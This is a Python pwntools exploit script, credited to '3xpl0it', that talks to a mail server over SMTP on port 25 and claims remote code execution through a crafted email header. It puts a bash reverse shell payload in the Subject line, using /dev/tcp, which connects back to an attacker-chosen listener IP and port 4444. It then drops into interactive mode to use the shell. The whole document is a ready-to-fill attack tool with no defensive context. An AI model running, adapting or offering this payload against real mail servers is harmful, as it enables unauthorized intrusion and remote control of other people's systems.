# RCE Through SMTP Header 
# Created by 3xpl0it
# GitHub : https://github.com/Hussien-Alzaghateet


from pwn import *

# Target details
target_ip = "" 
target_port = 25
listener_ip = ""
listener_port = 4444

# Establish connection
p = remote(target_ip, target_port)

# Debug banner
log.info(p.recvline().decode().strip())  #Server banner

# Send HELO
p.sendline(b"HELO mail.example.local") #change the hostname of the mail server
log.info(p.recvline().decode().strip())  

# Send MAIL FROM
p.sendline(b"MAIL FROM:<3xpl0it@0day.com>")
log.info(p.recvline().decode().strip())  

# Send RCPT TO
p.sendline(b"RCPT TO:<root@example.local>") #change the Target email
log.info(p.recvline().decode().strip())  

# Send DATA
p.sendline(b"DATA")
log.info(p.recvline().decode().strip())  

# Send email headers and payload
p.sendline(b"Date: Sat, 11 Jan 2025 12:47:44 -0500")
p.sendline(b"To: root@example.local")
p.sendline(b"From: 3xpl0it@0day.com")
p.sendline(f"Subject: |/bin/bash -c 'sh -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1'".encode())

# End DATA block with a dot
p.sendline(b".")
log.info(p.recvline().decode().strip())  # Final response from the server

# Switch to interactive mode
log.info("Payload sent. Check your listener for a reverse shell.")
p.interactive()
